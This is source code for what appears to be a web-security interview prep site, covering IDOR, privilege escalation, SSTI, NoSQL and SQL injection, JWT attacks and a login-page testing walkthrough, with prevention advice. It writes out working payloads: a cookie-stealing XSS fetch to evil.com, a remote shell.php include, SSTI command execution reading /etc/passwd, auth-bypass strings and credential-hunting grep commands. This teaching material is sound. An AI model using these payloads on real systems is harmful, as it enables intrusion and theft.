        <li>Whitelist allowed file extensions (not blacklist)</li>
        <li>Validate Content-Type AND magic bytes/file signature</li>
        <li>Store uploads outside webroot or on separate domain/CDN</li>
        <li>Rename uploaded files with random names</li>
        <li>Set proper permissions — never make uploads executable</li>
        <li>Use antivirus scanning on uploads</li>
      </ul>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🆔</span> IDOR — Vertical vs Horizontal (Detailed)</h2>
    <p>IDOR (Insecure Direct Object Reference) is a subset of Broken Access Control. Know the difference between vertical and horizontal:</p>

    <table class="comparison-table">
      <tr><th>Type</th><th>What Happens</th><th>Example</th></tr>
      <tr><td><strong>Horizontal IDOR</strong></td><td>Access another user's data <em>at the same privilege level</em></td><td>User A (role: user) accesses User B's (role: user) profile by changing ID</td></tr>
      <tr><td><strong>Vertical IDOR</strong></td><td>Access data/functions of a <em>higher privilege level</em></td><td>Normal user accesses admin panel by changing role parameter</td></tr>
    </table>

    ${caseStudy('Horizontal vs Vertical IDOR', `
      <p><strong>Horizontal IDOR:</strong></p>
      <div class="terminal-block"><div class="terminal-body"><span class="comment"># User "vaibhav" (ID: 101) is logged in</span>
<span class="cmd">GET /api/profile?user_id=101</span>  <span class="comment">→ sees own profile ✅</span>
<span class="warning">GET /api/profile?user_id=102</span>  <span class="comment">→ sees another user's profile! ❌ IDOR!</span>
<span class="warning">GET /api/orders?user_id=102</span>   <span class="comment">→ sees another user's orders! ❌ IDOR!</span></div></div>
      <p><strong>Vertical IDOR (Privilege Escalation):</strong></p>
      <div class="terminal-block"><div class="terminal-body"><span class="comment"># Normal user trying admin functions</span>
<span class="warning">GET /admin/users</span>              <span class="comment">→ sees all users! ❌</span>
<span class="warning">POST /api/user/delete?id=102</span>  <span class="comment">→ deletes another user! ❌</span>
<span class="warning">PUT /api/user/role?role=admin</span> <span class="comment">→ makes self admin! ❌</span></div></div>
      <p><strong>Where to find IDOR:</strong></p>
      <ul>
        <li>URL parameters: <code>?id=123</code>, <code>?user_id=456</code></li>
        <li>API endpoints: <code>/api/users/123</code></li>
        <li>Request body: <code>{"user_id": 123}</code></li>
        <li>Cookie values: <code>userId=123</code></li>
        <li>File references: <code>?file=report_123.pdf</code></li>
      </ul>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">⬆️</span> Privilege Escalation</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>

    <table class="comparison-table">
      <tr><th>Type</th><th>Description</th><th>Example</th></tr>
      <tr><td><strong>Horizontal</strong></td><td>Gain access to another user's resources at SAME privilege level</td><td>User A accesses User B's data</td></tr>
      <tr><td><strong>Vertical</strong></td><td>Gain HIGHER privileges than assigned</td><td>Normal user becomes admin</td></tr>
    </table>

    <h3>Web Application Privilege Escalation</h3>
    <ul>
      <li>Modifying role/privilege parameters in requests</li>
      <li>Accessing admin URLs directly (<code>/admin</code>, <code>/admin/dashboard</code>)</li>
      <li>Manipulating JWT tokens (changing role claim)</li>
      <li>Cookie manipulation (changing <code>isAdmin=false</code> to <code>isAdmin=true</code>)</li>
      <li>Parameter tampering in hidden form fields</li>
    </ul>

    <h3>Linux Privilege Escalation (for reference)</h3>
    ${terminal('Linux PrivEsc Techniques', `<span class="comment"># Check current user and permissions</span>
<span class="cmd">whoami</span>
<span class="cmd">id</span>
<span class="cmd">sudo -l</span>  <span class="comment"># What can I run as sudo?</span>

<span class="comment"># Find SUID binaries (run as owner, usually root)</span>
<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>

<span class="comment"># Check for writable /etc/passwd</span>
<span class="cmd">ls -la /etc/passwd</span>

<span class="comment"># Check cron jobs</span>
<span class="cmd">cat /etc/crontab</span>
<span class="cmd">ls -la /etc/cron.d/</span>

<span class="comment"># Check kernel version for known exploits</span>
<span class="cmd">uname -a</span>

<span class="comment"># Search for passwords in files</span>
<span class="cmd">grep -r "password" /etc/ 2>/dev/null</span>
<span class="cmd">find / -name "*.conf" -exec grep -l "pass" {} \\; 2>/dev/null</span>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🧪</span> Self XSS</h2>
    <p><strong>Severity:</strong> <span class="severity low">LOW</span> (alone) — but can be chained</p>
    <p>Self XSS is when the XSS payload only affects the user who enters it (e.g., in their own profile field). It doesn't directly impact other users.</p>

    <h3>Why it matters:</h3>
    <ul>
      <li><strong>Alone:</strong> Low impact — you can only "hack" yourself</li>
      <li><strong>Chained with CSRF:</strong> Attacker can trick victim into injecting the XSS payload, turning Self XSS into a weaponized attack</li>
      <li><strong>Chained with Login CSRF:</strong> Force victim to log into attacker's account with XSS payload, then steal data when victim interacts</li>
    </ul>

    ${caseStudy('Self XSS + CSRF Chain', `
      <p><strong>Scenario:</strong> User profile name field is vulnerable to XSS but only visible to the user themselves (Self XSS).</p>
      <p><strong>Attack Chain:</strong></p>
      <ol>
        <li>Attacker finds CSRF on profile update endpoint (no CSRF token)</li>
        <li>Attacker creates a malicious page with hidden form that updates victim's name to <code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code></li>
        <li>When victim visits attacker's page, CSRF fires and updates their profile name</li>
        <li>Next time victim visits their profile, XSS executes — cookie stolen!</li>
      </ol>
      <p><strong>Lesson:</strong> Never dismiss Self XSS entirely — always check if it can be chained with other vulnerabilities.</p>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔄</span> Insecure Deserialization</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>When an application deserializes (converts back to objects) untrusted data without validation. Can lead to Remote Code Execution (RCE).</p>

    <ul>
      <li><strong>Serialization:</strong> Converting an object into a format for storage/transmission (JSON, XML, binary)</li>
      <li><strong>Deserialization:</strong> Converting it back into an object</li>
      <li><strong>Vulnerability:</strong> If attacker can modify serialized data, they can change object properties or inject malicious objects</li>
    </ul>

    ${terminal('Deserialization Example', `<span class="comment"># PHP serialized cookie:</span>
<span class="string">O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:0;}</span>

<span class="comment"># Attacker modifies to:</span>
<span class="warning">O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}</span>
<span class="comment"># Changed admin:false → admin:true → privilege escalation!</span>

<span class="comment"># Java deserialization can lead to RCE</span>
<span class="comment"># Python pickle deserialization can execute arbitrary code</span>`)}

    ${conceptCard('success', '✅ Prevention', '<ul><li>Don\'t deserialize untrusted data</li><li>Use data formats like JSON that don\'t support object creation</li><li>Implement integrity checks (digital signatures/HMAC) on serialized data</li><li>Restrict deserialization to expected types only</li><li>Log deserialization failures</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📝</span> Server-Side Template Injection (SSTI)</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>When user input is embedded into server-side templates without sanitization. Can lead to RCE.</p>

    ${terminal('SSTI Examples', `<span class="comment"># Test for SSTI — enter these in input fields:</span>
<span class="warning">{{7*7}}</span>         <span class="comment"># If output shows 49, SSTI confirmed! (Jinja2/Twig)</span>
<span class="warning">\${7*7}</span>          <span class="comment"># Java-based templates (FreeMarker)</span>
<span class="warning"><%= 7*7 %></span>      <span class="comment"># ERB (Ruby)</span>

<span class="comment"># Exploit — Read files (Jinja2/Python):</span>
<span class="warning">{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}</span>

<span class="comment"># Exploit — RCE (Jinja2):</span>
<span class="warning">{{''.__class__.__mro__[1].__subclasses__()[XXX]('whoami',shell=True,stdout=-1).communicate()}}</span>`)}

    ${conceptCard('success', '✅ Prevention', '<ul><li>Never embed user input directly into templates</li><li>Use logic-less templates or sandboxed template engines</li><li>Validate and sanitize all user input</li><li>Use template engine auto-escaping features</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🏃</span> Race Conditions</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Occur when two or more operations must execute in a specific order, but an attacker can manipulate timing to create unintended behavior.</p>

    ${caseStudy('Race Condition — Double Spending', `
      <p><strong>Scenario:</strong> E-commerce site checks balance before deducting payment.</p>
      <p><strong>Attack:</strong> User has ₹1000. Sends two purchase requests for ₹800 simultaneously.</p>
      <ul>
        <li>Request 1: Checks balance (₹1000 ≥ ₹800) → Allows purchase</li>
        <li>Request 2: Checks balance (₹1000 ≥ ₹800) → Also allows purchase (before Request 1 deducted!)</li>
        <li>Result: Both purchases succeed, user spent ₹1600 with only ₹1000!</li>
      </ul>
      <p>Also applies to: Coupon codes used multiple times, voting systems, redeeming gift cards.</p>
      <p><strong>Prevention:</strong> Database locks, atomic transactions, mutex/semaphore, idempotency keys.</p>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🗃️</span> NoSQL Injection</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Similar to SQL injection but targets NoSQL databases (MongoDB, CouchDB). Uses JSON/BSON operators instead of SQL syntax.</p>

    ${terminal('NoSQL Injection Examples (MongoDB)', `<span class="comment"># Normal login request:</span>
<span class="cmd">POST /login</span>
{"username": "admin", "password": "password123"}

<span class="comment"># NoSQL Injection — bypass authentication:</span>
<span class="warning">{"username": "admin", "password": {"$ne": ""}}</span>
<span class="comment"># $ne means "not equal" — password != "" is always true!</span>

<span class="comment"># Other operators:</span>
<span class="warning">{"username": {"$gt": ""}, "password": {"$gt": ""}}</span>
<span class="comment"># $gt (greater than) "" — matches any non-empty string</span>

<span class="warning">{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}</span>
<span class="comment"># Use regex to enumerate usernames</span>`)}

    ${conceptCard('success', '✅ Prevention', '<ul><li>Validate and sanitize all user input</li><li>Use parameterized queries/ORM</li><li>Restrict MongoDB operators in user input</li><li>Apply least privilege to database accounts</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">⚙️</span> Process Hijacking</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>Gaining control of a running process to execute malicious code or escalate privileges.</p>

    <h3>Types of Process Hijacking</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>How It Works</th></tr>
      <tr><td><strong>DLL Hijacking</strong></td><td>Placing a malicious DLL in a directory that a program searches before the legitimate one</td></tr>
      <tr><td><strong>Process Injection</strong></td><td>Injecting code into a running process's memory space</td></tr>
      <tr><td><strong>DLL Side-Loading</strong></td><td>Exploiting legitimate applications to load malicious DLLs</td></tr>
      <tr><td><strong>Thread Hijacking</strong></td><td>Redirecting execution of an existing thread to malicious code</td></tr>
      <tr><td><strong>LD_PRELOAD (Linux)</strong></td><td>Setting environment variable to load malicious shared library before legitimate ones</td></tr>
    </table>

    <p><strong>Web Context:</strong> In web apps, process hijacking can relate to:</p>
    <ul>
      <li>Exploiting insecure process spawning (command injection)</li>
      <li>Hijacking worker processes via shared memory</li>
      <li>Exploiting race conditions in process management</li>
    </ul>
    <p><strong>Prevention:</strong> Validate library paths, use full paths for system calls, implement code signing, restrict LD_PRELOAD, use process isolation/containers.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">💉</span> Business Logic Vulnerabilities</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Flaws in the application's logic/workflow that allow users to do things the developer didn't intend. NOT technical bugs — they're design flaws.</p>

    ${caseStudy('Business Logic Flaws', `
      <p><strong>Negative Quantity:</strong> E-commerce site allows <code>quantity: -1</code> in cart. Price becomes negative, effectively giving money to the attacker's account.</p>
      <p><strong>Price Manipulation:</strong> Changing price parameter in request from <code>price=5000</code> to <code>price=1</code>.</p>
      <p><strong>Coupon Abuse:</strong> Applying the same discount code multiple times by intercepting and replaying the request.</p>
      <p><strong>Workflow Skip:</strong> Skipping payment step by directly navigating to order confirmation URL.</p>
      <p><strong>Prevention:</strong> Validate all business rules server-side, don't trust client-side data for pricing/quantities, implement proper workflow enforcement.</p>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔍</span> Information Disclosure</h2>
    <p>Application unintentionally reveals sensitive information to users.</p>
    <ul>
      <li><strong>Error messages</strong> exposing stack traces, database versions, file paths</li>
      <li><strong>Debug pages</strong> left enabled in production</li>
      <li><strong>Source code</strong> exposed via <code>.git</code>, <code>.svn</code>, backup files (<code>.bak</code>, <code>~</code>)</li>
      <li><strong>Robots.txt</strong> revealing hidden directories</li>
      <li><strong>Comments in HTML</strong> containing sensitive info</li>
      <li><strong>HTTP headers</strong> revealing server software and versions</li>
      <li><strong>Directory listing</strong> exposing file structure</li>
    </ul>
    <p><strong>Prevention:</strong> Generic error messages, disable debug mode, remove backup files, secure .git directories, remove server version headers.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🌐</span> Other Attacks to Know</h2>

    <h3>HTTP Request Smuggling</h3>
    <p>Exploits differences in how front-end and back-end servers parse HTTP requests. Attacker "smuggles" a second request inside the first one.</p>

    <h3>Web Cache Poisoning</h3>
    <p>Manipulating cached responses to serve malicious content to other users. Combine with XSS for widespread impact.</p>

    <h3>Host Header Injection</h3>
    <p>Manipulating the Host header to exploit password reset functionality, web cache poisoning, or access internal virtual hosts.</p>

    <h3>Open Redirect</h3>
    <p>Application redirects users to a URL specified in a parameter without validation. Used in phishing: <code>site.com/redirect?url=evil.com</code></p>

    <h3>Subdomain Takeover</h3>
    <p>Expired CNAME DNS records pointing to services that no longer exist. Attacker claims the external service and serves malicious content on the trusted subdomain.</p>

    <h3>CRLF Injection</h3>
    <p>Injecting carriage return and line feed characters (<code>\\r\\n</code>) into HTTP headers. Can lead to header injection, response splitting, or XSS.</p>

    <h3>JWT Attacks (Detailed)</h3>
    ${terminal('JWT Attack Techniques', `<span class="comment"># 1. Algorithm Confusion — change alg to "none"</span>
<span class="warning">{"alg": "none", "typ": "JWT"}</span>
<span class="comment"># Remove signature entirely — some servers accept it!</span>

<span class="comment"># 2. Change algorithm from RS256 to HS256</span>
<span class="comment"># Server uses public key as HMAC secret — attacker can forge tokens</span>

<span class="comment"># 3. Brute force weak secret</span>
<span class="cmd">hashcat -m 16500 jwt.txt wordlist.txt</span>

<span class="comment"># 4. Modify payload claims</span>
<span class="warning">{"user": "admin", "role": "admin", "exp": 9999999999}</span>
<span class="comment"># Change role, extend expiration, change user ID</span>

<span class="comment"># 5. JWK/JKU Header Injection</span>
<span class="comment"># Point to attacker's key server to validate with attacker's key</span>`)}
  </div>

  ${keyPoints([
    'Encoding ≠ Encryption! Base64 is encoding (not secure), AES is encryption',
    'XXE: disable external entities in XML parser. Test with &lt;!ENTITY&gt; payloads',
    'LFI: include local files (../../etc/passwd). RFI: include remote files (http://evil.com/shell.php)',
    'File Upload: validate extension + content type + magic bytes. Store outside webroot',
    'Horizontal IDOR: same level, different user. Vertical IDOR: different privilege level',
    'Privilege Escalation: horizontal (User A → User B) vs vertical (user → admin)',
    'Self XSS alone is low risk, but chained with CSRF becomes weaponized',
    'Deserialization: never deserialize untrusted data — can lead to RCE',
    'SSTI: test with {{7*7}} — if it returns 49, template injection confirmed',
    'Business Logic flaws: negative quantities, price manipulation, workflow skipping'
  ])}

  ${practiceBox([
    { text: 'PortSwigger Web Security Academy — ALL labs free', url: 'https://portswigger.net/web-security' },
    { text: 'OWASP Juice Shop — Modern vulnerable web app', url: 'https://owasp.org/www-project-juice-shop/' },
    { text: 'PentesterLab — Hands-on exercises', url: 'https://pentesterlab.com/' },
    { text: 'HackTricks — Comprehensive pentesting cheatsheet', url: 'https://book.hacktricks.xyz/' }
  ])}

  ${moduleFooter('mod6b', 'mod6', 'mod7')}`;
}


// ============ ADDITIONAL SCENARIO Q&A ============
// Override Module 9 to add more scenario questions
const _origModule9 = renderModule9;
renderModule9 = function() {
  return _origModule9().replace(
    '${moduleFooter(\'mod9\', \'mod8\', null)}',
    renderExtraScenarios() + '${moduleFooter(\'mod9\', \'mod8\', null)}'
  );
};

function renderExtraScenarios() {
  return `
  <div class="topic-section">
    <h2><span class="section-icon">🧩</span> Additional Scenario-Based Questions</h2>

    ${qa(51, 'You find a file upload feature on a website. How do you test it?', '1. <strong>Upload a web shell</strong> (shell.php) — check if it executes<br>2. <strong>Bypass extension filters</strong>: Try shell.php.jpg, shell.pHp, shell.php5, shell.php%00.jpg<br>3. <strong>Change Content-Type</strong>: Upload .php but change Content-Type header to image/jpeg<br>4. <strong>Add magic bytes</strong>: Add JPEG header (FF D8 FF E0) before PHP code<br>5. <strong>SVG with XSS</strong>: Upload SVG containing &lt;script&gt; tags<br>6. <strong>SVG with XXE</strong>: Upload SVG with external entity to read files<br>7. <strong>Large file DoS</strong>: Upload extremely large file to crash server<br>8. <strong>Path traversal in filename</strong>: <code>../../../etc/cron.d/shell</code><br>9. <strong>Check where files are stored</strong>: Are they in webroot? Can you access them directly?')}

    ${qa(52, 'You discover that an API returns user data including password hashes. What do you report?', '<strong>Vulnerability:</strong> Sensitive Data Exposure / Excessive Data Exposure (API)<br><strong>Severity:</strong> High<br><strong>Impact:</strong> Password hashes can be cracked offline using tools like Hashcat or John the Ripper. If users reuse passwords, their other accounts are also at risk.<br><strong>Also check:</strong><br>- What hashing algorithm? MD5/SHA-1 = Critical (easily crackable). bcrypt/argon2 = still bad to expose but harder to crack.<br>- Are they salted? Unsalted hashes can be cracked via rainbow tables.<br><strong>Remediation:</strong> API should never return password hashes. Implement proper response filtering. Apply principle of least privilege in API responses — only return necessary data.')}

    ${qa(53, 'A website has a "forgot password" feature. How do you test it?', '1. <strong>User Enumeration:</strong> Does it say "Email not found" vs "Reset link sent"? Different messages reveal valid emails<br>2. <strong>Token Analysis:</strong> Is the reset token predictable/sequential? Check randomness<br>3. <strong>Token Expiry:</strong> Does the token expire? How long is it valid?<br>4. <strong>Token Reuse:</strong> Can the same reset token be used multiple times?<br>5. <strong>Rate Limiting:</strong> Can you request unlimited reset emails? (spam/DoS)<br>6. <strong>Host Header Injection:</strong> Change Host header — does the reset link go to attacker\'s domain?<br>7. <strong>IDOR in Reset:</strong> Can you change the user ID/email in the reset request?<br>8. <strong>Password Policy on Reset:</strong> Does it accept weak new passwords?')}

    ${qa(54, 'You notice a website sends session tokens in the URL. What are the risks?', '<strong>Risks:</strong><br>1. <strong>Browser history:</strong> Session ID stored in browser history — anyone with access can hijack session<br>2. <strong>Referer header leak:</strong> When clicking external links, the full URL (with session ID) is sent as Referer header to the external site<br>3. <strong>Server logs:</strong> URLs are logged in web server access logs, proxy logs — session IDs exposed<br>4. <strong>Shoulder surfing:</strong> Session ID visible in the address bar<br>5. <strong>Sharing:</strong> User might copy-paste and share the URL inadvertently<br><strong>Fix:</strong> Session tokens should be in cookies with HttpOnly, Secure, and SameSite flags — NEVER in URLs.')}

    ${qa(55, 'How would you test a search functionality for vulnerabilities?', '1. <strong>Reflected XSS:</strong> Enter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — does it execute?<br>2. <strong>SQL Injection:</strong> Enter <code>\' OR 1=1 --</code> — does it affect the query?<br>3. <strong>Blind SQLi:</strong> Enter <code>\' AND SLEEP(5) --</code> — does response delay?<br>4. <strong>SSTI:</strong> Enter <code>{{7*7}}</code> — does it return 49?<br>5. <strong>LDAP Injection:</strong> Enter <code>*)(objectClass=*</code> if LDAP-backed<br>6. <strong>Open Redirect:</strong> Does the search redirect feature validate URLs?<br>7. <strong>Information Disclosure:</strong> Do error messages reveal database/technology info?<br>8. <strong>DoS:</strong> Very long search string, special characters, wildcard abuse')}

    ${qa(56, 'Explain the difference between encoding, encryption, and hashing with examples.', '<strong>Encoding</strong> transforms data for compatibility — NOT for security. Reversible without key.<br>Example: Base64(<code>admin</code>) = <code>YWRtaW4=</code>. Anyone can decode it.<br><br><strong>Encryption</strong> protects data confidentiality — requires a key to decrypt.<br>Example: AES-256 encrypts a file. Only someone with the key can read it.<br><br><strong>Hashing</strong> creates a fixed-length fingerprint — one-way, cannot be reversed.<br>Example: SHA-256(<code>password</code>) = <code>5e884898da...</code>. Used to verify passwords without storing them.<br><br><strong>Key difference:</strong> Encoding = format change. Encryption = security with key. Hashing = integrity check, no reversal.')}

    ${qa(57, 'What is the SSRF attack? Explain with a real-world scenario.', '<strong>SSRF = Server-Side Request Forgery.</strong> Attacker tricks the server into making requests to internal/unintended resources.<br><br><strong>Scenario:</strong> A website has a "preview URL" feature where you enter a URL and it shows a preview. The server fetches the URL content.<br><br><strong>Attack:</strong><br>1. Enter <code>http://localhost:3306</code> — probe internal MySQL service<br>2. Enter <code>http://169.254.169.254/latest/meta-data/</code> — access AWS metadata (steal IAM credentials!)<br>3. Enter <code>http://internal-admin-panel:8080/</code> — access internal services not exposed to internet<br>4. Enter <code>file:///etc/passwd</code> — read local files<br><br><strong>Real Impact:</strong> The 2019 Capital One breach involved SSRF to access AWS metadata, compromising 100M+ customer records.<br><br><strong>Prevention:</strong> Whitelist allowed URLs, block private/internal IPs, don\'t return raw responses, use network segmentation.')}

    ${qa(58, 'You are testing a mobile banking app. What security checks would you perform?', '1. <strong>SSL Pinning:</strong> Does the app validate server certificate? Can you bypass it with Frida/Objection?<br>2. <strong>Local Storage:</strong> Are credentials/tokens stored securely? Check SharedPreferences, Keychain, SQLite DBs<br>3. <strong>Root/Jailbreak Detection:</strong> Does the app detect rooted devices?<br>4. <strong>API Testing:</strong> Intercept API calls with Burp — check for IDOR, injection, auth bypass<br>5. <strong>Session Management:</strong> Token expiry, regeneration, secure storage<br>6. <strong>Hardcoded Secrets:</strong> Decompile APK — search for API keys, passwords<br>7. <strong>Input Validation:</strong> Test all fields for injection attacks<br>8. <strong>Transaction Security:</strong> Can you modify amount in transit? Race conditions?<br>9. <strong>Logging:</strong> Does the app log sensitive data? Check logcat output<br>10. <strong>Deep Link Abuse:</strong> Can deep links be exploited for phishing?')}

    ${qa(59, 'What is the difference between VA scan and manual penetration testing?', '<strong>VA Scan (Automated):</strong><br>- Uses tools like Nessus, OpenVAS, Qualys<br>- Scans for known CVEs and misconfigurations<br>- Fast, broad coverage<br>- Many false positives<br>- Cannot understand business logic<br>- Good for compliance<br><br><strong>Manual Penetration Testing:</strong><br>- Human tester using Burp Suite + manual techniques<br>- Tests business logic flaws, chained attacks, complex exploitation<br>- Fewer false positives (verified by tester)<br>- Can find zero-day vulnerabilities<br>- Slower but deeper<br>- Better for real security assessment<br><br><strong>Best approach:</strong> Both together — VA for broad coverage, PT for deep analysis.')}

    ${qa(60, 'A client says their website is HTTPS so it is fully secure. How do you respond?', 'HTTPS only protects <strong>data in transit</strong> (encryption between browser and server). It does NOT protect against:<br><br>1. <strong>SQL Injection</strong> — happens at the application level<br>2. <strong>XSS</strong> — JavaScript injection, works over HTTPS<br>3. <strong>Broken Access Control / IDOR</strong> — authorization logic flaw<br>4. <strong>Brute Force</strong> — encrypted or not, weak passwords can be guessed<br>5. <strong>Server Misconfigurations</strong> — default credentials, exposed admin panels<br>6. <strong>File Upload Vulnerabilities</strong> — malicious file upload<br>7. <strong>Business Logic Flaws</strong> — price manipulation, workflow bypass<br><br>HTTPS is necessary but NOT sufficient. You need application-level security (input validation, access control, secure coding) in addition to transport-level encryption.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔥</span> Quick-Fire Questions (commonly asked)</h2>
    ${qa(61, 'What port does HTTPS use?', '443. HTTP uses port 80.')}
    ${qa(62, 'What is a zero-day vulnerability?', 'A vulnerability that is unknown to the vendor and has no patch available. "Zero days" since the vendor has known about it. Extremely dangerous because there is no defense until a patch is released.')}
    ${qa(63, 'What is the difference between a virus, worm, and trojan?', '<strong>Virus:</strong> Malicious code that attaches to files and requires user action to spread.<br><strong>Worm:</strong> Self-replicating malware that spreads automatically across networks without user action.<br><strong>Trojan:</strong> Malware disguised as legitimate software. Does not self-replicate.')}
    ${qa(64, 'What is a honeypot?', 'A decoy system designed to attract attackers. Used to study attack techniques, detect intrusions, and divert attackers from real systems. Types: Low-interaction (simulated services) and High-interaction (full systems).')}
    ${qa(65, 'What is the principle of least privilege?', 'Users, processes, and systems should only have the minimum permissions necessary to perform their task — nothing more. Example: A database user for a web app should only have SELECT/INSERT on specific tables, not DROP TABLE or admin access.')}
    ${qa(66, 'What is defense in depth?', 'Using multiple layers of security controls so that if one layer fails, others still protect the system. Example: Firewall + WAF + Input Validation + Parameterized Queries + Least Privilege DB accounts = multiple layers against SQL injection.')}
    ${qa(67, 'What is SSL stripping?', 'MITM attack that downgrades HTTPS connections to HTTP. Attacker intercepts the initial HTTP request (before redirect to HTTPS) and communicates with the server over HTTPS while communicating with the victim over HTTP. Prevention: HSTS header forces browser to only use HTTPS.')}
    ${qa(68, 'What is a CVE?', '<strong>Common Vulnerabilities and Exposures</strong> — a standardized identifier for known vulnerabilities. Format: CVE-YEAR-NUMBER (e.g., CVE-2021-44228 for Log4Shell). Published in the NVD (National Vulnerability Database) with severity scores.')}
  </div>`;
}

// Fix the module footer references for the new module order
// Update MODULES array to fix navigation
const origMod7Content = MODULES.find(m => m.id === 'mod7');
const origMod8Content = MODULES.find(m => m.id === 'mod8');
const origMod9Content = MODULES.find(m => m.id === 'mod9');

// Override the render functions to fix footer navigation
const _origMod7 = renderModule7;
renderModule7 = function() {
  return _origMod7().replace(
    "navigate('mod6')",
    "navigate('mod6b')"
  );
};


// Fix Module 6 footer to point to mod6b
const _origMod6Render = MODULES.find(m => m.id === 'mod6').content;
MODULES.find(m => m.id === 'mod6').content = function() {
  return _origMod6Render().replace(
    "navigate('mod7')",
    "navigate('mod6b')"
  ).replace(
    "Next: Security Tools →",
    "Next: Advanced Attacks →"
  );
};

// Fix Module 6B footer
// Already handled in the module footer

// Fix dashboard to show 10 modules
const _origDashboard = renderDashboard;
renderDashboard = function() {
  return _origDashboard().replace('9</div><div class="stat-label">Modules', MODULES.length + '</div><div class="stat-label">Modules');
};


// ============ BLACK BOX LOGIN PAGE TESTING SCENARIO ============
// Add as a dedicated case study section in Module 9

const _origModule9v2 = renderModule9;
renderModule9 = function() {
  return _origModule9v2().replace(
    renderExtraScenarios(),
    renderBlackBoxLogin() + renderExtraScenarios()
  );
};

function renderBlackBoxLogin() {
  return `
  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> MASTER SCENARIO: Black Box Testing a Login Page (Step-by-Step)</h2>
    <p>This is one of the <strong>most commonly asked interview questions</strong> at security companies. Here is the complete, structured approach a VAPT professional would follow.</p>

    ${conceptCard('highlight', '💡 Interview Framework', '<p>When answering this, structure your response in phases: <strong>Reconnaissance → Information Gathering → Authentication Testing → Session Testing → Input Validation → Business Logic → Reporting</strong>. This shows the interviewer you think methodically.</p>')}

    <h3>🔍 Phase 1: Reconnaissance & Observation</h3>
    <p><em>"Before I touch anything, I observe everything."</em></p>
    <table class="comparison-table">
      <tr><th>Check</th><th>What to Look For</th><th>Why It Matters</th></tr>
      <tr><td>View page source</td><td>Hidden fields, comments, JS files, API endpoints</td><td>Devs often leave sensitive info in comments or hidden fields</td></tr>
      <tr><td>Check URL structure</td><td>Is it /login, /api/auth, /user/login?</td><td>Reveals technology stack and API patterns</td></tr>
      <tr><td>Check HTTP vs HTTPS</td><td>Is the login page served over HTTPS?</td><td>HTTP = credentials sent in plaintext (critical finding)</td></tr>
      <tr><td>Technology fingerprinting</td><td>Response headers (Server, X-Powered-By), cookies, error pages</td><td>Knowing the stack helps choose targeted attacks</td></tr>
      <tr><td>robots.txt & sitemap.xml</td><td>Hidden admin panels, backup pages</td><td>May reveal /admin, /backup, /old-login</td></tr>
      <tr><td>Check for CAPTCHA</td><td>Is there CAPTCHA? Can it be bypassed?</td><td>No CAPTCHA = brute force possible</td></tr>
    </table>

    ${terminal('Phase 1: Recon Commands', `<span class="comment"># View response headers</span>
<span class="cmd">curl -I https://target.com/login</span>

<span class="comment"># Check for hidden directories</span>
<span class="cmd">gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt</span>

<span class="comment"># Check robots.txt</span>
<span class="cmd">curl https://target.com/robots.txt</span>

<span class="comment"># Check technology stack</span>
<span class="comment"># Look at: Server header, X-Powered-By, Set-Cookie names</span>
<span class="comment"># PHPSESSID → PHP, JSESSIONID → Java, connect.sid → Node.js</span>`)}

    <h3>📡 Phase 2: Traffic Interception (Burp Suite Setup)</h3>
    <p><em>"Set up Burp Suite to intercept and analyze every request."</em></p>
    <ol>
      <li>Configure browser proxy to <code>127.0.0.1:8080</code></li>
      <li>Turn on Intercept in Burp Proxy</li>
      <li>Submit a normal login (test/test) and capture the request</li>
      <li>Analyze: What parameters? POST or GET? Content-Type? Any hidden fields?</li>
    </ol>

    ${terminal('Captured Login Request Example', `<span class="cmd">POST /api/login HTTP/1.1</span>
<span class="highlight">Host: target.com</span>
<span class="highlight">Content-Type: application/x-www-form-urlencoded</span>
<span class="highlight">Cookie: session=abc123</span>

<span class="string">username=test&password=test&csrf_token=xyz789</span>

<span class="comment"># Things to note:</span>
<span class="comment"># 1. Is there a CSRF token? (if yes, CSRF protection exists)</span>
<span class="comment"># 2. Is password sent in plaintext or hashed?</span>
<span class="comment"># 3. What's the Content-Type? (form data vs JSON)</span>
<span class="comment"># 4. Any hidden parameters?</span>`)}

    <h3>🔓 Phase 3: Authentication Testing</h3>

    <h4>3.1 — SQL Injection</h4>
    ${terminal('SQLi on Login', `<span class="comment"># Send to Burp Repeater and try these payloads:</span>

<span class="comment"># In username field:</span>
<span class="warning">admin' --</span>
<span class="warning">admin' OR '1'='1' --</span>
<span class="warning">' OR 1=1 --</span>
<span class="warning">' OR '1'='1</span>
<span class="warning">admin'/*</span>
<span class="warning">" OR "1"="1" --</span>

<span class="comment"># In password field:</span>
<span class="warning">' OR '1'='1</span>
<span class="warning">' OR 1=1 #</span>

<span class="comment"># Time-based blind SQLi:</span>
<span class="warning">' OR SLEEP(5) --</span>
